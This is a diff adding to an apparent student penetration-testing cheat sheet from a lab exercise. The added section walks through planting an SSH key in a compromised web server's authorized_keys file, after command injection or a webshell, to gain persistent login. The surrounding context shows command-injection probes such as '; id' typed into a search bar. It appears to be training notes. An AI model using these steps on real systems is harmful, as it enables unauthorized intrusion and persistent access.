@@ -97,6 +97,35 @@ id    # or whoami to see if it worked
 ; id    # enter in searchbar to verify that it works
 
 ## SSH Keys
+# Pair with either Command Injection or Webshell
+
+1) generate SSH Keys on whichever host you plan on logging in from, 
+ssh-keygen -t rsa -b 4096		# generate keys
+
+cat /home/student/.ssh/id_rsa.pub		# show your ssh key
+
+2) Determine the user on the webserver
+whoami (through Command Injection or Webshell)
+
+3) Determine the user's home directory
+/etc/passwd (again through Command Injection or Webshell)
+# in this example the users home dir is /var/www
+
+4) Determine if .ssh/ dir exists in the users home dir, if not create it
+ls -la /var/www
+# if its not there...
+mkdir /var/www/.ssh		# creates ssh dir, use ls again to make sure it has been created
+
+5) Inject our key into the authorized_keys file
+echo "<your Key here>" > /var/www/.ssh/authorized_keys		# insert your ssh key from step 1
+
+cat /var/www/.ssh/authorized_keys		# to check that key is there
+
+6) Login from the workstation you generated the key from
+ssh <username>@<ip>
+
+## webservers default directory
+http://10.50.34.125/ = /var/www/html		# this is NOT where we put .ssh
 
 
 
@@ -104,3 +133,18 @@ id    # or whoami to see if it worked
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+generate keys
